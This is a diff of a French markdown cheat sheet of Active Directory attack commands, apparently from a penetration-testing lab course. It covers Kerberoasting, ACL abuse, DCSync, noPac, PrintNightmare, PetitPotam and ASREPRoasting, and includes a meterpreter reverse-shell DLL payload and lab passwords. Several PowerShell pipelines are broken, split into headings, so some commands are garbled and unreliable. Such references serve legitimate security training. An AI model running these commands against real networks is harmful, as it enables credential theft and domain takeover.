-### Utilisé pour visualiser les options et la fonctionnalité possibles avec l'outil Rubeus. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour visualiser les options et la fonctionnalité possibles avec l'outil `Rubeus`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `.\Rubeus.exe`
-```shell
-### Utilisé pour vérifier les statistiques kerberoast (/stats) dans le domaine Windows cible depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour vérifier les statistiques kerberoast (`/stats`) dans le domaine Windows cible depuis un hôte basé sur Windows.
+
 ```bash
 `.\Rubeus.exe kerberoast /stats`
-```shell
-### Utilisé pour demander/télécharger des tickets TGS pour les comptes avec le admin count défini sur 1, puis formate la sortie d'une manière facile à visualiser et à cracker (/nowrap). Exécuté depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour demander/télécharger des tickets TGS pour les comptes avec le `admin` count défini sur `1`, puis formate la sortie d'une manière facile à visualiser et à cracker (`/nowrap`). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`
-```shell
-### Utilisé pour demander/télécharger un ticket TGS pour un utilisateur spécifique (/user:testspn), puis formate la sortie d'une manière facile à visualiser et à cracker (/nowrap). Exécuté depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour demander/télécharger un ticket TGS pour un utilisateur spécifique (`/user:testspn`), puis formate la sortie d'une manière facile à visualiser et à cracker (`/nowrap`). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `.\Rubeus.exe kerberoast /user:testspn /nowrap`
-```shell
-### Outil PowerView utilisé pour vérifier l'attribut msDS-SupportedEncryptionType associé à un compte utilisateur spécifique (testspn). Exécuté depuis un hôte basé sur Windows.
+```
+
+### Outil PowerView utilisé pour vérifier l'attribut `msDS-SupportedEncryptionType` associé à un compte utilisateur spécifique (`testspn`). Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`
-```shell
-### Utilisé pour tenter de cracker le hash du ticket en utilisant une liste de mots (rockyou.txt) depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour tenter de cracker le hash du ticket en utilisant une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux.
+
 ```bash
 `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`
-```shell
+```
+
 ## Énumération et Tactiques ACL
 
 ### Outil PowerView utilisé pour trouver des ACL d'objets dans le domaine Windows cible avec des droits de modification définis pour des objets non intégrés depuis un hôte basé sur Windows.
+
 ```bash
 `Find-InterestingDomainAcl`
-```shell
-### Utilisé pour importer PowerView et récupérer le SID d'un compte utilisateur spécifique (wley) depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour importer PowerView et récupérer le `SID` d'un compte utilisateur spécifique (`wley`) depuis un hôte basé sur Windows.
+
 ```bash
 `Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley`
-```shell
-### ? {$_.SecurityIdentifier -eq $sid}
+```
+
+### ? {$_.SecurityIdentifier -eq $sid}`
+
 ```bash
 `Get-DomainObjectACL -Identity * \
-```shell
+```
+
 ### Select Name,DisplayName,DistinguishedName,rightsGuid \
+
 ```bash
 `$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \
-```shell
-### ? {$_.SecurityIdentifier -eq $sid}
+```
+
+### ? {$_.SecurityIdentifier -eq $sid}`
+
 ```bash
 `Get-DomainObjectACL -ResolveGUIDs -Identity * \
-```shell
-### Select-Object -ExpandProperty SamAccountName > ad_users.txt
+```
+
+### Select-Object -ExpandProperty SamAccountName > ad_users.txt`
+
 ```bash
 `Get-ADUser -Filter * \
-```shell
+```
+
 ### Select-Object Path -ExpandProperty Access \
+
 ```bash
 `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \
-```shell
-### Utilisé pour créer un Objet PSCredential depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour créer un `Objet PSCredential` depuis un hôte basé sur Windows.
+
 ```bash
 `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`
-```shell
-### Utilisé pour créer un Objet SecureString depuis un hôte basé sur Windows.
+```
+
+### Utilisé pour créer un `Objet SecureString` depuis un hôte basé sur Windows.
+
 ```bash
 `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
-```shell
-### Outil PowerView utilisé pour changer le mot de passe d'un utilisateur spécifique (damundsen) sur un domaine Windows cible depuis un hôte basé sur Windows.
+```
+
+### Outil PowerView utilisé pour changer le mot de passe d'un utilisateur spécifique (`damundsen`) sur un domaine Windows cible depuis un hôte basé sur Windows.
+
 ```bash
 `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`
-```shell
-### Select -ExpandProperty Members
+```
+
+### Select -ExpandProperty Members`
+
 ```bash
 `Get-ADGroup -Identity "Help Desk Level 1" -Properties * \
-```shell
-### Outil PowerView utilisé pour ajouter un utilisateur spécifique (damundsen) à un groupe de sécurité spécifique (Help Desk Level 1) dans un domaine Windows cible depuis un hôte basé sur Windows.
+```
+
+### Outil PowerView utilisé pour ajouter un utilisateur spécifique (`damundsen`) à un groupe de sécurité spécifique (`Help Desk Level 1`) dans un domaine Windows cible depuis un hôte basé sur Windows.
+
 ```bash
 `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
-```shell
-### Select MemberName
+```
+
+### Select MemberName`
+
 ```bash
 `Get-DomainGroupMember -Identity "Help Desk Level 1" \
-```shell
-### Outil PowerView utilisé pour créer un faux Service Principal Name pour un utilisateur spécifique (adunn) depuis un hôte basé sur Windows.
+```
+
+### Outil PowerView utilisé pour créer un faux `Service Principal Name` pour un utilisateur spécifique (`adunn`) depuis un hôte basé sur Windows.
+
 ```bash
 `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
-```shell
-### Outil PowerView utilisé pour supprimer le faux Service Principal Name créé pendant l'attaque depuis un hôte basé sur Windows.
+```
+
+### Outil PowerView utilisé pour supprimer le faux `Service Principal Name` créé pendant l'attaque depuis un hôte basé sur Windows.
+
 ```bash
 `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`
-```shell
-### Outil PowerView utilisé pour retirer un utilisateur spécifique (damundsent) d'un groupe de sécurité spécifique (Help Desk Level 1) depuis un hôte basé sur Windows.
+```
+
+### Outil PowerView utilisé pour retirer un utilisateur spécifique (`damundsent`) d'un groupe de sécurité spécifique (`Help Desk Level 1`) depuis un hôte basé sur Windows.
+
 ```bash
 `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`
-```shell
-### Cmdlet PowerShell utilisé pour convertir une chaîne SDDL dans un format lisible. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Cmdlet PowerShell utilisé pour convertir une `chaîne SDDL` dans un format lisible. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `ConvertFrom-SddlString`
-```shell
+```
+
+
+
 # DCSync, Accès Privilégié et Exploits Windows
 
 ## Table des matières
-
 1. [DCSync](#dcsync)
 2. [Accès Privilégié](#accès-privilégié)
 3. [NoPac](#nopac)
@@ -2711,169 +3829,246 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 ## DCSync
 
 ### select samaccountname,objectsid,memberof,useraccountcontrol \
+
 ```bash
 `Get-DomainUser -Identity adunn \
-```shell
+```
+
 ### ? { ($_.ObjectAceType -match 'Replication-Get')} \
+
 ```bash
 `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \
-```shell
-### Outil Impacket utilisé pour extraire les hachages NTLM du fichier NTDS.dit hébergé sur un contrôleur de domaine cible (172.16.5.5) et enregistrer les hachages extraits dans un fichier (inlanefreight_hashes). Exécuté depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour extraire les hachages NTLM du fichier NTDS.dit hébergé sur un contrôleur de domaine cible (`172.16.5.5`) et enregistrer les hachages extraits dans un fichier (`inlanefreight_hashes`). Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`
-```shell
-### Utilise Mimikatz pour effectuer une attaque dcsync depuis un hôte basé sur Windows.
+```
+
+### Utilise `Mimikatz` pour effectuer une attaque `dcsync` depuis un hôte basé sur Windows.
+
 ```bash
 `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`
-```shell
+```
+
 ## Accès Privilégié
 
-### Outil basé sur PowerView utilisé pour énumérer le groupe Utilisateurs Bureau à distance sur une cible Windows (-ComputerName ACADEMY-EA-MS01) depuis un hôte basé sur Windows.
+### Outil basé sur PowerView utilisé pour énumérer le groupe `Utilisateurs Bureau à distance` sur une cible Windows (`-ComputerName ACADEMY-EA-MS01`) depuis un hôte basé sur Windows.
+
 ```bash
 `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`
-```shell
-### Outil basé sur PowerView utilisé pour énumérer le groupe Utilisateurs de gestion à distance sur une cible Windows (-ComputerName ACADEMY-EA-MS01) depuis un hôte basé sur Windows.
+```
+
+### Outil basé sur PowerView utilisé pour énumérer le groupe `Utilisateurs de gestion à distance` sur une cible Windows (`-ComputerName ACADEMY-EA-MS01`) depuis un hôte basé sur Windows.
+
 ```bash
 `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`
-```shell
-### Crée une variable ($password) définie comme égale au mot de passe (Klmcargo2) d'un utilisateur depuis un hôte basé sur Windows.
+```
+
+### Crée une variable (`$password`) définie comme égale au mot de passe (`Klmcargo2`) d'un utilisateur depuis un hôte basé sur Windows.
+
 ```bash
 `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`
-```shell
-### Crée une variable ($cred) définie comme égale au nom d'utilisateur (forend) et au mot de passe ($password) d'un compte de domaine cible depuis un hôte basé sur Windows.
+```
+
+### Crée une variable (`$cred`) définie comme égale au nom d'utilisateur (`forend`) et au mot de passe (`$password`) d'un compte de domaine cible depuis un hôte basé sur Windows.
+
 ```bash
 `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`
-```shell
-### Utilise le cmdlet PowerShell Enter-PSSession pour établir une session PowerShell avec une cible sur le réseau (-ComputerName ACADEMY-EA-DB01) depuis un hôte basé sur Windows. S'authentifie à l'aide des informations d'identification créées dans les 2 commandes présentées précédemment ($cred & $password).
+```
+
+### Utilise le cmdlet PowerShell `Enter-PSSession` pour établir une session PowerShell avec une cible sur le réseau (`-ComputerName ACADEMY-EA-DB01`) depuis un hôte basé sur Windows. S'authentifie à l'aide des informations d'identification créées dans les 2 commandes présentées précédemment (`$cred` & `$password`).
+
 ```bash
 `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`
-```shell
-### Utilisé pour établir une session PowerShell avec une cible Windows depuis un hôte basé sur Linux en utilisant WinRM.
+```
+
+### Utilisé pour établir une session PowerShell avec une cible Windows depuis un hôte basé sur Linux en utilisant `WinRM`.
+
 ```bash
 `evil-winrm -i 10.129.201.234 -u forend`
-```shell
-### Utilisé pour importer l'outil PowerUpSQL.
+```
+
+### Utilisé pour importer l'outil `PowerUpSQL`.
+
 ```bash
 `Import-Module .\PowerUpSQL.ps1`
-```shell
+```
+
 ### Outil PowerUpSQL utilisé pour énumérer les instances de serveur SQL depuis un hôte basé sur Windows.
+
 ```bash
 `Get-SQLInstanceDomain`
-```shell
-### Outil PowerUpSQL utilisé pour se connecter à un serveur SQL et interroger la version (-query 'Select @@version') depuis un hôte basé sur Windows.
+```
+
+### Outil PowerUpSQL utilisé pour se connecter à un serveur SQL et interroger la version (`-query 'Select @@version'`) depuis un hôte basé sur Windows.
+
 ```bash
 `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'`
-```shell
-### Outil Impacket utilisé pour afficher les fonctionnalités et les options fournies avec mssqlclient.py depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour afficher les fonctionnalités et les options fournies avec `mssqlclient.py` depuis un hôte basé sur Linux.
+
 ```bash
 `mssqlclient.py`
-```shell
+```
+
 ### Outil Impacket utilisé pour se connecter à un serveur MSSQL depuis un hôte basé sur Linux.
+
 ```bash
 `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`
-```shell
+```
+
 ### Utilisé pour afficher les options de mssqlclient.py une fois connecté à un serveur MSSQL.
+
 ```bash
 `SQL> help`
-```shell
-### Utilisé pour activer la procédure stockée xp_cmdshell qui permet d'exécuter des commandes OS via la base de données depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour activer la `procédure stockée xp_cmdshell` qui permet d'exécuter des commandes OS via la base de données depuis un hôte basé sur Linux.
+
 ```bash
 `SQL> enable_xp_cmdshell`
-```shell
-### Utilisé pour énumérer les droits sur un système en utilisant xp_cmdshell.
+```
+
+### Utilisé pour énumérer les droits sur un système en utilisant `xp_cmdshell`.
+
 ```bash
 `xp_cmdshell whoami /priv`
-```shell
+```
+
 ## NoPac
 
-### Utilisé pour cloner un exploit noPac à l'aide de git. Exécuté depuis un hôte basé sur Linux.
+### Utilisé pour cloner un exploit `noPac` à l'aide de git. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo git clone https://github.com/Ridter/noPac.git`
-```shell
-### Exécute scanner.py pour vérifier si un système cible est vulnérable à noPac/Sam_The_Admin depuis un hôte basé sur Linux.
+```
+
+### Exécute `scanner.py` pour vérifier si un système cible est vulnérable à `noPac`/`Sam_The_Admin` depuis un hôte basé sur Linux.
+
 ```bash
 `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`
-```shell
-### Utilisé pour exploiter la vulnérabilité noPac/Sam_The_Admin et obtenir un shell SYSTEM (-shell). Exécuté depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour exploiter la vulnérabilité `noPac`/`Sam_The_Admin` et obtenir un shell SYSTEM (`-shell`). Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`
-```shell
-### Utilisé pour exploiter la vulnérabilité noPac/Sam_The_Admin et effectuer une attaque DCSync contre le compte Administrateur intégré sur un contrôleur de domaine depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour exploiter la vulnérabilité `noPac`/`Sam_The_Admin` et effectuer une attaque `DCSync` contre le compte Administrateur intégré sur un contrôleur de domaine depuis un hôte basé sur Linux.
+
 ```bash
 `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`
-```shell
+```
+
 ## PrintNightmare
 
 ### Utilisé pour cloner un exploit PrintNightmare à l'aide de git depuis un hôte basé sur Linux.
+
 ```bash
 `git clone https://github.com/cube0x0/CVE-2021-1675.git`
-```shell
-### Utilisé pour s'assurer que la version Impacket de l'auteur de l'exploit (cube0x0) est installée. Cela désinstalle également toute version précédente d'Impacket sur un hôte basé sur Linux.
+```
+
+### Utilisé pour s'assurer que la version Impacket de l'auteur de l'exploit (`cube0x0`) est installée. Cela désinstalle également toute version précédente d'Impacket sur un hôte basé sur Linux.
+
 ```bash
 `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install`
-```shell
+```
+
 ### egrep 'MS-RPRN\
+
 ```bash
 `rpcdump.py @172.16.5.5 \
-```shell
+```
+
 ### Utilisé pour générer une charge utile DLL à utiliser par l'exploit pour obtenir une session shell. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll`
-```shell
-### Utilisé pour créer un serveur SMB et héberger un dossier partagé (CompData) à l'emplacement spécifié sur l'hôte linux local. Cela peut être utilisé pour héberger la charge utile DLL que l'exploit tentera de télécharger sur l'hôte. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour créer un serveur SMB et héberger un dossier partagé (`CompData`) à l'emplacement spécifié sur l'hôte linux local. Cela peut être utilisé pour héberger la charge utile DLL que l'exploit tentera de télécharger sur l'hôte. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`
-```shell
+```
+
 ### Exécute l'exploit et spécifie l'emplacement de la charge utile DLL. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'`
-```shell
+```
+
 ## PetitPotam
 
-### Outil Impacket utilisé pour créer un relais NTLM en spécifiant l'URL d'inscription web pour l'hôte de l'autorité de certification. Exécuté depuis un hôte basé sur Linux.
+### Outil Impacket utilisé pour créer un `relais NTLM` en spécifiant l'URL d'inscription web pour l'hôte de l'`autorité de certification`. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
-```shell
-### Utilisé pour cloner l'exploit PetitPotam à l'aide de git. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour cloner l'exploit `PetitPotam` à l'aide de git. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `git clone https://github.com/topotam/PetitPotam.git`
-```shell
-### Utilisé pour exécuter l'exploit PetitPotam en spécifiant l'adresse IP de l'hôte d'attaque (172.16.5.255) et le contrôleur de domaine cible (172.16.5.5). Exécuté depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour exécuter l'exploit PetitPotam en spécifiant l'adresse IP de l'hôte d'attaque (`172.16.5.255`) et le contrôleur de domaine cible (`172.16.5.5`). Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `python3 PetitPotam.py 172.16.5.225 172.16.5.5`
-```shell
-### Utilise gettgtpkinit.py pour demander un ticket TGT pour le contrôleur de domaine (dc01.ccache) depuis un hôte basé sur Linux.
+```
+
+### Utilise `gettgtpkinit.py` pour demander un ticket TGT pour le contrôleur de domaine (`dc01.ccache`) depuis un hôte basé sur Linux.
+
 ```bash
 `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`
-```shell
-### Outil Impacket utilisé pour effectuer une attaque DCSync et récupérer un ou tous les hachages de mot de passe NTLM du domaine Windows cible. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour effectuer une attaque DCSync et récupérer un ou tous les `hachages de mot de passe NTLM` du domaine Windows cible. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
-```shell
-### Commande krb5-user utilisée pour afficher le contenu du fichier ccache. Exécutée depuis un hôte basé sur Linux.
+```
+
+### Commande `krb5-user` utilisée pour afficher le contenu du fichier `ccache`. Exécutée depuis un hôte basé sur Linux.
+
 ```bash
 `klist`
-```shell
-### Utilisé pour soumettre des demandes TGS à l'aide de getnthash.py depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour soumettre des demandes TGS à l'aide de `getnthash.py` depuis un hôte basé sur Linux.
+
 ```bash
 `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`
-```shell
-### Outil Impacket utilisé pour extraire des hachages de NTDS.dit à l'aide d'une attaque DCSync et d'un hachage capturé (-hashes). Exécuté depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour extraire des hachages de `NTDS.dit` à l'aide d'une `attaque DCSync` et d'un hachage capturé (`-hashes`). Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`
-```shell
-### Utilise Rubeus pour demander un TGT et effectuer une attaque pass-the-ticket en utilisant le compte machine (/user:ACADEMY-EA-DC01$) d'une cible Windows. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Utilise Rubeus pour demander un TGT et effectuer une `attaque pass-the-ticket` en utilisant le compte machine (`/user:ACADEMY-EA-DC01$`) d'une cible Windows. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt`
-```shell
-### Effectue une attaque DCSync à l'aide de Mimikatz. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Effectue une attaque DCSync à l'aide de `Mimikatz`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`
-```shell
+```
+
+
+
 # Mauvaises Configurations, Relations de Confiance et XSS
 
 ## Table des matières
-
 1. [Mauvaises Configurations Diverses](#mauvaises-configurations-diverses)
 2. [Énumération et Attaques de Stratégie de Groupe](#énumération-et-attaques-de-stratégie-de-groupe)
 3. [ASREPRoasting](#asreproasting)
@@ -2883,202 +4078,295 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 
 ## Mauvaises Configurations Diverses
 
-### Utilisé pour importer le module Security Assessment.ps1. Exécuté depuis un hôte basé sur Windows.
+### Utilisé pour importer le module `Security Assessment.ps1`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Import-Module .\SecurityAssessment.ps1`
-```shell
-### Outil basé sur SecurityAssessment.ps1 utilisé pour énumérer une cible Windows pour le bug d'imprimante MS-PRN. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Outil basé sur SecurityAssessment.ps1 utilisé pour énumérer une cible Windows pour le `bug d'imprimante MS-PRN`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
-```shell
-### Utilisé pour résoudre tous les enregistrements dans une zone DNS via LDAP depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour résoudre tous les enregistrements dans une zone DNS via `LDAP` depuis un hôte basé sur Linux.
+
 ```bash
 `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`
-```shell
-### Utilisé pour résoudre les enregistrements inconnus dans une zone DNS en effectuant une requête A (-r) depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour résoudre les enregistrements inconnus dans une zone DNS en effectuant une `requête A` (`-r`) depuis un hôte basé sur Linux.
+
 ```bash
 `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`
-```shell
-### Select-Object samaccountname,description
+```
+
+### Select-Object samaccountname,description`
+
 ```bash
 `Get-DomainUser * \
-```shell
-### Select-Object samaccountname,useraccountcontrol
+```
+
+### Select-Object samaccountname,useraccountcontrol`
+
 ```bash
 `Get-DomainUser -UACFilter PASSWD_NOTREQD \
-```shell
+```
+
 ### Utilisé pour lister le contenu d'un partage hébergé sur une cible Windows depuis le contexte d'un utilisateur actuellement connecté. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
-```shell
+```
+
 ## Énumération et Attaques de Stratégie de Groupe
 
-### Outil utilisé pour déchiffrer un mot de passe de préférence de stratégie de groupe capturé depuis un hôte basé sur Linux.
+### Outil utilisé pour déchiffrer un `mot de passe de préférence de stratégie de groupe` capturé depuis un hôte basé sur Linux.
+
 ```bash
 `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`
-```shell
-### grep gpp
+```
+
+### grep gpp`
+
 ```bash
 `crackmapexec smb -L \
-```shell
-### Localise et récupère toutes les informations d'identification stockées dans le partage SYSVOL d'une cible Windows en utilisant CrackMapExec depuis un hôte basé sur Linux.
+```
+
+### Localise et récupère toutes les informations d'identification stockées dans le partage `SYSVOL` d'une cible Windows en utilisant `CrackMapExec` depuis un hôte basé sur Linux.
+
 ```bash
 `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`
-```shell
-### select displayname
+```
+
+### select displayname`
+
 ```bash
 `Get-DomainGPO \
-```shell
-### Select DisplayName
+```
+
+### Select DisplayName`
+
 ```bash
 `Get-GPO -All \
-```shell
-### Crée une variable appelée $sid qui est définie comme égale à l'outil Convert-NameToSid et spécifie le compte de groupe Domain Users. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Crée une variable appelée `$sid` qui est définie comme égale à l'outil `Convert-NameToSid` et spécifie le compte de groupe `Domain Users`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `$sid=Convert-NameToSid "Domain Users"`
-```shell
+```
+
 ### Get-ObjectAcl \
+
 ```bash
 `Get-DomainGPO \
-```shell
-### Cmdlet PowerShell utilisé pour afficher le nom d'une GPO étant donné un GUID. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Cmdlet PowerShell utilisé pour afficher le nom d'une GPO étant donné un `GUID`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`
-```shell
+```
+
 ## ASREPRoasting
 
 ### select samaccountname,userprincipalname,useraccountcontrol \
+
 ```bash
 `Get-DomainUser -PreauthNotRequired \
-```shell
-### Utilise Rubeus pour effectuer une attaque ASREP Roasting et formate la sortie pour Hashcat. Exécuté depuis un hôte basé sur Windows.
+```
+
+### Utilise `Rubeus` pour effectuer une `attaque ASREP Roasting` et formate la sortie pour `Hashcat`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`
-```shell
-### Utilise Hashcat pour tenter de cracker le hash capturé en utilisant une liste de mots (rockyou.txt). Exécuté depuis un hôte basé sur Linux.
+```
+
+### Utilise `Hashcat` pour tenter de cracker le hash capturé en utilisant une liste de mots (`rockyou.txt`). Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`
-```shell
-### Énumère les utilisateurs dans un domaine Windows cible et récupère automatiquement l'AS pour tous les utilisateurs trouvés qui ne nécessitent pas de pré-authentification Kerberos. Exécuté depuis un hôte basé sur Linux.
+```
+
+### Énumère les utilisateurs dans un domaine Windows cible et récupère automatiquement l'`AS` pour tous les utilisateurs trouvés qui ne nécessitent pas de pré-authentification Kerberos. Exécuté depuis un hôte basé sur Linux.
+
 ```bash
 `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`
-```shell
+```
+
 ## Relations de Confiance - Enfant > Parent
 
-### Utilisé pour importer le module Active Directory. Exécuté depuis un hôte basé sur Windows.
+### Utilisé pour importer le module `Active Directory`. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Import-Module activedirectory`
-```shell
+```
+
 ### Cmdlet PowerShell utilisé pour énumérer les relations de confiance d'un domaine Windows cible. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-ADTrust -Filter *`
-```shell
+```
+
 ### Outil PowerView utilisé pour énumérer les relations de confiance d'un domaine Windows cible. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainTrust`
-```shell
+```
+
 ### Outil PowerView utilisé pour effectuer une cartographie des relations de confiance de domaine depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainTrustMapping`
-```shell
-### select SamAccountName
+```
+
+### select SamAccountName`
+
 ```bash
 `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \
-```shell
-### Utilise Mimikatz pour obtenir le NT Hash du compte KRBTGT depuis un hôte basé sur Windows.
+```
+
+### Utilise Mimikatz pour obtenir le `NT Hash` du compte `KRBTGT` depuis un hôte basé sur Windows.
+
 ```bash
 `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`
-```shell
+```
+
 ### Outil PowerView utilisé pour obtenir le SID d'un domaine enfant cible depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainSID`
-```shell
-### select distinguishedname,objectsid
+```
+
+### select distinguishedname,objectsid`
+
 ```bash
 `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \
-```shell
+```
+
 ### Utilisé pour tenter de lister le contenu du lecteur C sur un contrôleur de domaine cible. Exécuté depuis un hôte basé sur Windows.
+
 ```bash
 `ls \\academy-ea-dc01.inlanefreight.local\c$`
-```shell
-### Utilise Mimikatz pour créer un Golden Ticket depuis un hôte basé sur Windows.
+```
+
